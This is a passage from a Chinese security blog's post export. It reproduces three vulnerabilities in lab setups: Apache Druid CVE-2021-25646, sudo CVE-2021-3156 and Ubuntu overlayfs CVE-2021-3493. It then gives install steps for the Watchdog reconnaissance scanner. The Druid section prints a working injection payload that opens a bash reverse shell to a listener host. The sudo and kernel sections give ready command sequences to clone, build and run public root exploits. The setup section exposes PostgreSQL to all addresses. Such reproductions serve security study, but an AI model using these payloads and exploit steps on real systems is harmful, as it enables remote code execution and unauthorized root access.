-    <content><![CDATA[<h2 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00  简介"></a>0x00  简介</h2><p>Druid 是一个分布式的、支持实时多维 OLAP 分析的数据处理系统。它既支持高速的数据实时摄入处理，也支持实时且灵活的多维数据分析查询。因此 Druid 最常用的场景就是大数据背景下、灵活快速的多维 OLAP 分析。 另外，Druid 还有一个关键的特点：它支持根据时间戳对数据进行预聚合摄入和聚合分析，因此也有用户经常在有时序数据处理分析的场景中用到它。</p>
-<h2 id="0x01-漏洞概述"><a href="#0x01-漏洞概述" class="headerlink" title="0x01  漏洞概述"></a>0x01  漏洞概述</h2><p>Apache Druid 是用Java编写的面向列的开源分布式数据存储，旨在快速获取大量事件数据，并在数据之上提供低延迟查询。<br>Apache Druid 默认情况下缺乏授权认证，攻击者可以发送特制请求，利用Druid服务器上进程的特权执行任意代码。</p>
-<h2 id="0x02-影响版本"><a href="#0x02-影响版本" class="headerlink" title="0x02  影响版本"></a>0x02  影响版本</h2><p>Apache Druid &lt; 0.20.1</p>
-<h2 id="0x03-环境搭建"><a href="#0x03-环境搭建" class="headerlink" title="0x03  环境搭建"></a>0x03  环境搭建</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  获取 druid 镜像</span><br><span class="line">sudo docker pull fokkodriesprong&#x2F;docker-druid</span><br><span class="line">#  重启 docker</span><br><span class="line">sudo systemctl restart docker</span><br><span class="line">#  启动 druid 环境</span><br><span class="line">sudo docker run -d -p 8888:8888 fokkodriesprong&#x2F;docker-druid</span><br><span class="line">#  查看环境</span><br><span class="line">sudo docker ps</span><br><span class="line">#  进入环境目录（目录名为启动 shrio 环境时返回的名字（或用查看环境的命令查看））</span><br><span class="line">sudo docker exec -it 268f542b6482 bash</span><br></pre></td></tr></table></figure>
-<h2 id="0x04-漏洞利用"><a href="#0x04-漏洞利用" class="headerlink" title="0x04  漏洞利用"></a>0x04  漏洞利用</h2><p>1、Win10 监听 9999 端口</p>
-<p><img src= "/img/loading.gif" data-lazy-src="/2021/02/15/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20Druid%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE-2021-25646/nc-1.png"></p>
-<p>2、访问 <code>http://192.168.10.233:8888/unified-console.html</code> 并单击 <code>Load data</code></p>
-<p><img src= "/img/loading.gif" data-lazy-src="/2021/02/15/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20Druid%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE-2021-25646/web-1.png"></p>
-<p>3、在 <code>Base directory</code> 跟 <code>File filter</code> 处分别填入如下内容，然后单击 <code>Next: Parse data</code> 并抓包</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">quickstart&#x2F;tutorial&#x2F;</span><br><span class="line">wikiticker-2015-09-12-sampled.json.gz</span><br></pre></td></tr></table></figure>
-<p><img src= "/img/loading.gif" data-lazy-src="/2021/02/15/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20Druid%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE-2021-25646/web-2.png"></p>
-<p>4、使用 BP 抓包后构建poc</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;type&quot;:&quot;index&quot;,&quot;spec&quot;:&#123;&quot;ioConfig&quot;:&#123;&quot;type&quot;:&quot;index&quot;,&quot;firehose&quot;:&#123;&quot;type&quot;:&quot;local&quot;,&quot;baseDir&quot;:&quot;quickstart&#x2F;tutorial&#x2F;&quot;,&quot;filter&quot;:&quot;wikiticker-2015-09-12-sampled.json.gz&quot;&#125;&#125;,&quot;dataSchema&quot;:&#123;&quot;dataSource&quot;:&quot;sample&quot;,&quot;parser&quot;:&#123;&quot;type&quot;:&quot;string&quot;,&quot;parseSpec&quot;:&#123;&quot;format&quot;:&quot;json&quot;,&quot;timestampSpec&quot;:&#123;&quot;column&quot;:&quot;time&quot;,&quot;format&quot;:&quot;iso&quot;&#125;,&quot;dimensionsSpec&quot;:&#123;&#125;&#125;&#125;,&quot;transformSpec&quot;:&#123;&quot;transforms&quot;:[],&quot;filter&quot;:&#123;&quot;type&quot;:&quot;javascript&quot;,</span><br><span class="line"> </span><br><span class="line">&quot;function&quot;:&quot;function(value)&#123;return java.lang.Runtime.getRuntime().exec(&#39;&#x2F;bin&#x2F;bash -c $@|bash 0 echo bash -i &gt;&amp;&#x2F;dev&#x2F;tcp&#x2F;192.168.10.114&#x2F;9999 0&gt;&amp;1&#39;)&#125;&quot;,</span><br><span class="line"> </span><br><span class="line">&quot;dimension&quot;:&quot;added&quot;,</span><br><span class="line"> </span><br><span class="line">&quot;&quot;:&#123;</span><br><span class="line"> </span><br><span class="line">&quot;enabled&quot;:&quot;true&quot;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">&#125;&#125;&#125;&#125;,&quot;samplerConfig&quot;:&#123;&quot;numRows&quot;:500,&quot;cacheKey&quot;:&quot;79a5be988bf94d42a6f219b63ff27383&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>
-<p><img src= "/img/loading.gif" data-lazy-src="/2021/02/15/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20Druid%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE-2021-25646/bp.png"></p>
-<p>5、此时 Win10 已收到反弹的shell</p>
-<p><img src= "/img/loading.gif" data-lazy-src="/2021/02/15/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20Druid%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE-2021-25646/nc-2.png"></p>
-<h2 id="0x05-漏洞修复"><a href="#0x05-漏洞修复" class="headerlink" title="0x05  漏洞修复"></a>0x05  漏洞修复</h2><p>升级到最新版本</p>
-<h2 id="0x06-参考-URL"><a href="#0x06-参考-URL" class="headerlink" title="0x06 参考 URL"></a>0x06 参考 URL</h2><p><a href="https://blog.csdn.net/xuandao_ahfengren/article/details/113573652">https://blog.csdn.net/xuandao_ahfengren/article/details/113573652</a></p>
-]]></content>
-      <categories>
-        <category>漏洞复现</category>
-      </categories>
-      <tags>
-        <tag>漏洞复现</tag>
-        <tag>Apache Druid 漏洞复现</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Linux sudo CVE-2021-3156 提权漏洞复现</title>
-    <url>/2021/02/17/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Linux%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/sudo/sudo%20%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<h2 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00  简介"></a>0x00  简介</h2><p>sudo是<a href="https://baike.baidu.com/item/linux%E7%B3%BB%E7%BB%9F/1732935">linux系统</a>管理指令，是允许<a href="https://baike.baidu.com/item/%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86%E5%91%98/1503845">系统管理员</a>让普通用户执行一些或者全部的root命令的一个工具，如halt，reboot，su等等。这样不仅减少了root用户的登录 和管理时间，同样也提高了安全性。sudo不是对shell的一个代替，它是面向每个命令的。</p>
-<h2 id="0x01-漏洞概述"><a href="#0x01-漏洞概述" class="headerlink" title="0x01  漏洞概述"></a>0x01  漏洞概述</h2><p>1月26日，Sudo发布安全通告，修复了一个类Unix操作系统在命令参数中转义反斜杠时存在基于堆的缓冲区溢出漏洞。当sudo通过-s或-i命令行选项在shell模式下运行命令时，它将在命令参数中使用反斜杠转义特殊字符。但使用-s或 -i标志运行sudoedit时，实际上并未进行转义，从而可能导致缓冲区溢出。只要存在sudoers文件（通常是 /etc/sudoers），攻击者就可以使用本地普通用户利用sudo获得系统root权限。请受影响的用户尽快采取措施进行防护。</p>
-<h2 id="0x02-影响版本"><a href="#0x02-影响版本" class="headerlink" title="0x02  影响版本"></a>0x02  影响版本</h2><p>Sudo 1.8.2 - 1.8.31p2</p>
-<p>Sudo 1.9.0 - 1.9.5p1</p>
-<h2 id="0x03-环境搭建"><a href="#0x03-环境搭建" class="headerlink" title="0x03  环境搭建"></a>0x03  环境搭建</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  获取环境</span><br><span class="line">sudo docker pull manishfoodtechs&#x2F;xfcefulldesktop_ubuntu20.4</span><br><span class="line">#  运行环境</span><br><span class="line">sudo docker run -it manishfoodtechs&#x2F;xfcefulldesktop_ubuntu20.4 &#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>
-<h2 id="0x04-漏洞利用"><a href="#0x04-漏洞利用" class="headerlink" title="0x04  漏洞利用"></a>0x04  漏洞利用</h2><p>新建测试用户</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">useradd test</span><br><span class="line">echo test:123 | chpasswd</span><br><span class="line">su test</span><br></pre></td></tr></table></figure>
-<p><img src= "/img/loading.gif" data-lazy-src="/2021/02/17/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Linux%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/sudo/sudo%20%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/test_user.png"></p>
-<p>查看 sudo 版本</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo --version</span><br></pre></td></tr></table></figure>
-<p><img src= "/img/loading.gif" data-lazy-src="/2021/02/17/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Linux%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/sudo/sudo%20%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/sudo_version.png"></p>
-<p>查看系统版本</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lsb_release -a</span><br></pre></td></tr></table></figure>
-<p><img src= "/img/loading.gif" data-lazy-src="/2021/02/17/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Linux%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/sudo/sudo%20%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/system_version.png"></p>
-<p>找一个有写入权限的目录并下载运行 <a href="https://github.com/blasty/CVE-2021-3156">exp</a></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;tmp</span><br><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;blasty&#x2F;CVE-2021-3156.git</span><br><span class="line">cd CVE-2021-3156</span><br><span class="line">make</span><br><span class="line">chmod +x sudo-hax-me-a-sandwich</span><br><span class="line">.&#x2F;sudo-hax-me-a-sandwich 1</span><br></pre></td></tr></table></figure>
-<p><img src= "/img/loading.gif" data-lazy-src="/2021/02/17/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Linux%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/sudo/sudo%20%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/exp.png"></p>
-<p>查看 <a href="https://github.com/blasty/CVE-2021-3156">exp</a> 可用目标</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;sudo-hax-me-a-sandwich</span><br></pre></td></tr></table></figure>
-<p><img src= "/img/loading.gif" data-lazy-src="/2021/02/17/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Linux%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/sudo/sudo%20%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/target.png"></p>
-<h2 id="0x05-漏洞修复"><a href="#0x05-漏洞修复" class="headerlink" title="0x05  漏洞修复"></a>0x05  漏洞修复</h2><p>参考：<a href="http://blog.nsfocus.net/cve-2021-3156/">http://blog.nsfocus.net/cve-2021-3156/</a></p>
-<h2 id="0x06-参考-URL"><a href="#0x06-参考-URL" class="headerlink" title="0x06 参考 URL"></a>0x06 参考 URL</h2><p><a href="https://www.cnblogs.com/Rain99-/p/14354452.html">https://www.cnblogs.com/Rain99-/p/14354452.html</a></p>
-<p><a href="https://www.cnblogs.com/yujin2020/p/14377503.html">https://www.cnblogs.com/yujin2020/p/14377503.html</a></p>
-<p><a href="https://blog.csdn.net/xuandao_ahfengren/article/details/113447282">https://blog.csdn.net/xuandao_ahfengren/article/details/113447282</a></p>
-]]></content>
-      <categories>
-        <category>漏洞复现</category>
-      </categories>
-      <tags>
-        <tag>漏洞复现</tag>
-        <tag>Linux 漏洞复现</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>内核提权 CVE-2021-3493 漏洞复现</title>
-    <url>/2021/04/23/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Linux%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<h2 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00  简介"></a>0x00  简介</h2><p><strong>OverlayFS</strong> 是一种叠合式文件系统，能够在底层文件系统上叠加另一个文件系统</p>
-<h2 id="0x01-漏洞概述"><a href="#0x01-漏洞概述" class="headerlink" title="0x01  漏洞概述"></a>0x01  漏洞概述</h2><p>Linux 内核中 overlayfs 文件系统是 Ubuntu 的特定问题，由于没有正确的验证文件系统功能在用户名称空间中的应用，从而导致攻击者可以安装一个允许未授权挂载的 overlayfs 修补程序来提升权限</p>
-<h2 id="0x02-影响版本"><a href="#0x02-影响版本" class="headerlink" title="0x02  影响版本"></a>0x02  影响版本</h2><p>Ubuntu 20.10</p>
-<p>Ubuntu 20.04 LTS</p>
-<p>Ubuntu 18.04 LTS</p>
-<p>Ubuntu 16.04 LTS</p>
-<p>Ubuntu 14.04 ESM</p>
-<h2 id="0x03-环境搭建"><a href="#0x03-环境搭建" class="headerlink" title="0x03  环境搭建"></a>0x03  环境搭建</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  下载 ubuntu 20.04.1 镜像</span><br><span class="line">http:&#x2F;&#x2F;old-releases.ubuntu.com&#x2F;releases&#x2F;20.04.1&#x2F;ubuntu-20.04.1-desktop-amd64.iso</span><br><span class="line"></span><br><span class="line">#  如上述链接访问失败，则访问如下链接进行下载</span><br><span class="line">http:&#x2F;&#x2F;old-releases.ubuntu.com&#x2F;releases&#x2F;20.04.1&#x2F;</span><br></pre></td></tr></table></figure>
-<p>安装步骤参考：<a href="https://www.cnblogs.com/ubuntuanzhuang/p/ubuntu20_4.html">https://www.cnblogs.com/ubuntuanzhuang/p/ubuntu20_4.html</a></p>
-<h2 id="0x04-漏洞利用"><a href="#0x04-漏洞利用" class="headerlink" title="0x04  漏洞利用"></a>0x04  漏洞利用</h2><p>1、进入系统后先尝试下载 <a href="https://github.com/ASkyeye/CVE-2021-3493.git">POC</a> ，看看是否有对当前所在的文件夹有写入的权限</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;ASkyeye&#x2F;CVE-2021-3493.git</span><br></pre></td></tr></table></figure>
-<p><img src= "/img/loading.gif" data-lazy-src="/2021/04/23/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Linux%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/1.png"></p>
-<p>此时可发现当用户对 “/“ 目录没有写入权限，此时需要进入一个有写入权限的目录进行下载（普通用户有写入权限的目录常见为：/tmp、桌面、/home/用户名）</p>
-<p>2、进入一个有写入权限的目录，然后重新尝试下载</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;tmp</span><br><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;ASkyeye&#x2F;CVE-2021-3493.git</span><br></pre></td></tr></table></figure>
-<p><img src= "/img/loading.gif" data-lazy-src="/2021/04/23/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Linux%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/2.png"></p>
-<p>3、下载完后进入目录，然后进行编译，最后再给编译完后的文件添加执行权限并运行</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd CVE-2021-3493&#x2F;</span><br><span class="line">gcc exploit.c -o exploit</span><br><span class="line">chmod +x exploit.c</span><br><span class="line">.&#x2F;exploit</span><br></pre></td></tr></table></figure>
-<p><img src= "/img/loading.gif" data-lazy-src="/2021/04/23/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Linux%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/3.png"></p>
-<p>此时可看到已获取到管理员权限（ ”#“ 号代表管理员权限）</p>
-<p><img src= "/img/loading.gif" data-lazy-src="/2021/04/23/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Linux%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/4.png"></p>
-<h2 id="0x05-漏洞修复"><a href="#0x05-漏洞修复" class="headerlink" title="0x05  漏洞修复"></a>0x05  漏洞修复</h2><p>更新到新版本</p>
-<h2 id="0x06-参考-URL"><a href="#0x06-参考-URL" class="headerlink" title="0x06 参考 URL"></a>0x06 参考 URL</h2><p><a href="https://ssd-disclosure.com/ssd-advisory-overlayfs-pe/">https://ssd-disclosure.com/ssd-advisory-overlayfs-pe/</a></p>
-<p><a href="https://ubuntu.com/security/CVE-2021-3493">https://ubuntu.com/security/CVE-2021-3493</a></p>
-<p><a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=7c03e2cda4a584cadc398e8f6641ca9988a39d52">https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=7c03e2cda4a584cadc398e8f6641ca9988a39d52</a></p>
-<p><a href="https://www.openwall.com/lists/oss-security/2021/04/16/1">https://www.openwall.com/lists/oss-security/2021/04/16/1</a></p>
-<p><a href="https://github.com/ASkyeye/CVE-2021-3493">https://github.com/ASkyeye/CVE-2021-3493</a></p>
-]]></content>
-      <categories>
-        <category>漏洞复现</category>
-      </categories>
-      <tags>
-        <tag>Linux</tag>
-        <tag>漏洞复现</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Watchdog</title>
-    <url>/2021/02/11/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/Watchdog/Watchdog/</url>
-    <content><![CDATA[<h2 id="安装所需环境"><a href="#安装所需环境" class="headerlink" title="安装所需环境"></a>安装所需环境</h2><p>详细参考：<a href="https://github.com/CTF-MissFeng/Watchdog">https://github.com/CTF-MissFeng/Watchdog</a></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  安装 Python</span><br><span class="line">sudo apt-get install python3 python3-pip -y</span><br><span class="line">#  安装 Python 相关环境</span><br><span class="line">sudo apt install build-essential libssl-dev libffi-dev python3-dev -y</span><br><span class="line"></span><br><span class="line">#  安装 Nmap</span><br><span class="line">sudo apt install nmap -y</span><br><span class="line">#  安装 Chromium 浏览器</span><br><span class="line">sudo apt-get install chromium-browser -y</span><br><span class="line"></span><br><span class="line">#  下载环境</span><br><span class="line">mkdir &#x2F;test</span><br><span class="line">cd &#x2F;test</span><br><span class="line">sudo git clone https:&#x2F;&#x2F;github.com&#x2F;CTF-MissFeng&#x2F;Watchdog.git</span><br><span class="line">#  安装文件内的库</span><br><span class="line">sudo pip3 install -r &#x2F;test&#x2F;Watchdog&#x2F;requirements.txt</span><br></pre></td></tr></table></figure>
-<h2 id="安装数据库"><a href="#安装数据库" class="headerlink" title="安装数据库"></a>安装数据库</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  安装 PostgreSQL数据库</span><br><span class="line">sudo apt install postgresql postgresql-contrib -y</span><br><span class="line">#  指定 postgres 用户打开客户端工具 psql</span><br><span class="line">sudo -u postgres psql</span><br><span class="line">#  设置 postgres 用户密码（设置完后按 Ctrl + z 退出）</span><br><span class="line">\password postgres</span><br><span class="line"></span><br><span class="line">#  备份 PostgreSQL数据库 配置文件</span><br><span class="line">sudo cp -a &#x2F;etc&#x2F;postgresql&#x2F;10&#x2F;main&#x2F;postgresql.conf &#x2F;etc&#x2F;postgresql&#x2F;10&#x2F;main&#x2F;postgresql.conf.bak_2021.2.8</span><br><span class="line"></span><br><span class="line">#  设置 PostgreSQL 数据库允许远程访问</span><br><span class="line">sudo sed -i &quot;60i listen_addresses &#x3D; &#39;*&#39;&quot; &#x2F;etc&#x2F;postgresql&#x2F;10&#x2F;main&#x2F;postgresql.conf</span><br><span class="line">sudo sed -i &quot;88i host  all  all 0.0.0.0&#x2F;0 md5&quot; &#x2F;etc&#x2F;postgresql&#x2F;10&#x2F;main&#x2F;pg_hba.conf</span><br><span class="line"></span><br><span class="line">#  查看是否写入</span><br><span class="line">sed -n &quot;58,62p&quot; &#x2F;etc&#x2F;postgresql&#x2F;10&#x2F;main&#x2F;postgresql.conf</span><br><span class="line">sudo sed -n &quot;86,89p&quot; &#x2F;etc&#x2F;postgresql&#x2F;10&#x2F;main&#x2F;pg_hba.conf</span><br></pre></td></tr></table></figure>
-<h2 id="修改-Watchdog-配置文件"><a href="#修改-Watchdog-配置文件" class="headerlink" title="修改 Watchdog 配置文件"></a>修改 Watchdog 配置文件</h2><h3 id="修改-web-数据库连接设置"><a href="#修改-web-数据库连接设置" class="headerlink" title="修改 web 数据库连接设置"></a>修改 web 数据库连接设置</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  备份配置文件</span><br><span class="line">sudo cp -a &#x2F;test&#x2F;Watchdog&#x2F;web&#x2F;config.py &#x2F;test&#x2F;Watchdog&#x2F;web&#x2F;config.py.bak_2021.2.8</span><br><span class="line">#  修改 web 数据库连接设置</span><br><span class="line">sudo sed -i &#39;s&#x2F;postgres:\w\+&#x2F;postgres:admin&#x2F;g&#39; &#x2F;test&#x2F;Watchdog&#x2F;web&#x2F;config.py</span><br><span class="line">sudo sed -i &#39;s&#x2F;127.0.0.1\&#x2F;src&#x2F;127.0.0.1&#x2F;g&#39; &#x2F;test&#x2F;Watchdog&#x2F;web&#x2F;config.py</span><br></pre></td></tr></table></figure>
-<p><img src= "/img/loading.gif" data-lazy-src="/2021/02/11/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/Watchdog/Watchdog/set_config-1.png"></p>
-<h3 id="修改-client-数据库连接配置"><a href="#修改-client-数据库连接配置" class="headerlink" title="修改 client 数据库连接配置"></a>修改 client 数据库连接配置</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  备份配置文件</span><br><span class="line">sudo cp -a &#x2F;test&#x2F;Watchdog&#x2F;client&#x2F;database.py &#x2F;test&#x2F;Watchdog&#x2F;client&#x2F;database.py.bak_2020.2.8</span><br><span class="line">#  修改 client 数据库连接配置</span><br><span class="line">sudo sed -i &#39;s&#x2F;postgres:\w\+&#x2F;postgres:admin&#x2F;g&#39; &#x2F;test&#x2F;Watchdog&#x2F;client&#x2F;database.py</span><br><span class="line">sudo sed -i &#39;s&#x2F;127.0.0.1\&#x2F;src&#x2F;127.0.0.1&#x2F;g&#39; &#x2F;test&#x2F;Watchdog&#x2F;client&#x2F;database.py</span><br><span class="line"></span><br><span class="line">#  重启数据库服务</span><br><span class="line">sudo systemctl restart postgresql</span><br></pre></td></tr></table></figure>
-<p><img src= "/img/loading.gif" data-lazy-src="/2021/02/11/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/Watchdog/Watchdog/set_config-2.png"></p>
-<h3 id="添加-shodan-api"><a href="#添加-shodan-api" class="headerlink" title="添加 shodan api"></a>添加 shodan api</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  备份配置文件</span><br><span class="line">sudo cp -a &#x2F;test&#x2F;Watchdog&#x2F;client&#x2F;subdomain&#x2F;oneforall&#x2F;config.py &#x2F;test&#x2F;Watchdog&#x2F;client&#x2F;subdomain&#x2F;oneforall&#x2F;config.py.bak_2021.2.8</span><br><span class="line">#  在域名扫描的工具模块内添加 shodan api（将此处命令中的 test 替换成 api）</span><br><span class="line">sudo sed -i &#39;s&#x2F;xxxxxx&#x2F;test&#x2F;g&#39; &#x2F;test&#x2F;Watchdog&#x2F;client&#x2F;subdomain&#x2F;oneforall&#x2F;config.py</span><br></pre></td></tr></table></figure>
-<p><img src= "/img/loading.gif" data-lazy-src="/2021/02/11/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/Watchdog/Watchdog/shodan_api.png"></p>
-<h2 id="启动环境"><a href="#启动环境" class="headerlink" title="启动环境"></a>启动环境</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  修改测试账户的密码为12345678（测试账户密码需大于或等于 8 位，否则将无法登陆 web）</span><br><span class="line">sudo sed -i &#39;s&#x2F;qazxsw@123&#x2F;12345678&#x2F;g&#39; &#x2F;test&#x2F;Watchdog&#x2F;app.py</span><br><span class="line">#  配置环境变量</span><br><span class="line">cd &#x2F;test&#x2F;Watchdog</span><br><span class="line">export FLASK_APP&#x3D;app.py:APP</span><br><span class="line">#  查看帮助文档</span><br><span class="line">sudo flask --help</span><br><span class="line">#  创建数据库</span><br><span class="line">sudo flask createdb</span><br><span class="line">#  创建测试账户（如没修改账号跟密码则默认为：root&#x2F;qazxsw@123）</span><br><span class="line">sudo flask createuser</span><br><span class="line">#  启动服务（需确保端口没被占用）</span><br><span class="line">sudo flask run -p 8080 -h 0.0.0.0</span><br><span class="line"></span><br><span class="line">#  后台运行（需确保端口没被占用）</span><br><span class="line">sudo nohup flask run -p 8080 -h 0.0.0.0 &gt; web.log 2&gt;&amp;1 &amp;</span><br><span class="line">#  查看日志</span><br><span class="line">cat web.log</span><br></pre></td></tr></table></figure>
-<p><img src= "/img/loading.gif" data-lazy-src="/2021/02/11/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/Watchdog/Watchdog/start.png"></p>
-<h2 id="运行脚本"><a href="#运行脚本" class="headerlink" title="运行脚本"></a>运行脚本</h2><h3 id="添加厂商"><a href="#添加厂商" class="headerlink" title="添加厂商"></a>添加厂商</h3><p>运行脚本前需添加厂商</p>
-<p><img src= "/img/loading.gif" data-lazy-src="/2021/02/11/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/Watchdog/Watchdog/web-1.png"></p>
-<p><img src= "/img/loading.gif" data-lazy-src="/2021/02/11/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/Watchdog/Watchdog/web-2.png"></p>
-<h3 id="子域名扫描"><a href="#子域名扫描" class="headerlink" title="子域名扫描"></a>子域名扫描</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 启动子域名扫描</span><br><span class="line">cd &#x2F;test&#x2F;Watchdog&#x2F;client&#x2F;subdomain&#x2F;oneforall</span><br><span class="line">sudo python3 -u sbudomain_run.py</span><br><span class="line"></span><br><span class="line">#  后台运行</span><br><span class="line">sudo nohup python3 -u sbudomain_run.py &gt; dns.log 2&gt;&amp;1 &amp;</span><br><span class="line"># 查看日志</span><br><span class="line">cat dns.log</span><br></pre></td></tr></table></figure>
-<h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 启动端口扫描</span><br><span class="line">cd &#x2F;test&#x2F;Watchdog&#x2F;client&#x2F;portscan</span><br><span class="line">sudo python3 -u portscan_run.py</span><br><span class="line"></span><br><span class="line">#  后台运行</span><br><span class="line">sudo nohup python3 -u portscan_run.py &gt; port.log 2&gt;&amp;1 &amp;</span><br><span class="line">#  查看日志</span><br><span class="line">cat port.log</span><br></pre></td></tr></table></figure>
